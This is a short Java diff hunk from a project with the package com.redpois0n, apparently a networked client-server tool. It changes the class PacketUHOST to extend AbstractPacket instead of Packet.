@@ -6,7 +6,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.common.os.OperatingSystem;
 
 
-public class PacketUHOST extends Packet {
+public class PacketUHOST extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
